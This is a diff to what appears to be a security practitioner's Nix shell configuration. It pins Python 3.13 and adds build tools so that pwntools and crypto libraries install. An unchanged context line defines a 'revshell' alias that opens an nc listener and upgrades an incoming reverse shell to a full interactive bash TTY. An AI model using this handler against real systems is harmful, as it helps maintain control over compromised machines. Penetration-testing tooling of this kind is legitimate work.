@@ -227,11 +227,18 @@
         revshell = "echo -n 'Enter the port number: '; read port && stty raw -echo; (echo '/bin/python3 -c \"import pty;pty.spawn(\"/bin/bash\")\" || /bin/python -c \"import pty;pty.spawn(\"/bin/bash\")\" || /bin/python2 -c \"import pty;pty.spawn(\"/bin/bash\")\" || /bin/ruby -e \"exec \"/bin/bash\"\" || /bin/perl -e \"exec \"/bin/bash\";\" || /bin/lua -e \"require(\"os\");os.execute(\"/bin/bash\")\"'; echo 'stty'$(stty -a | awk -F ';' '{print $2 $3}' | head -n 1); echo 'export TERM=xterm-256color'; echo 'export SHELL=/bin/bash'; echo reset; cat) | nc -lvnp \"$port\" && reset";
 
         # shell aliases
+        # Pin to Python 3.13: the system python3 (3.14) has no prebuilt
+        # `unicorn` wheel (a pwntools dep), so pip falls back to compiling it
+        # from source, which fails in the Nix shell. 3.13 has manylinux wheels.
+        # Also put build tools on PATH as a backstop so any package lacking a
+        # compatible wheel can still build from source (needs pkg-config/cmake/gcc).
         python3-shell = ''
           _python3_shell() {
             local venv_dir=".venv"
-            python3 -m venv "$venv_dir" && \
+            PATH="${lib.makeBinPath [ pkgs.pkg-config pkgs.cmake pkgs.gnumake pkgs.gcc ]}:$PATH" \
+            ${pkgs.python313}/bin/python3 -m venv "$venv_dir" && \
             source "$venv_dir/bin/activate" && \
+            PATH="${lib.makeBinPath [ pkgs.pkg-config pkgs.cmake pkgs.gnumake pkgs.gcc ]}:$PATH" \
             pip install pycryptodome pycryptodomex pwntools requests
           } && _python3_shell
         '';
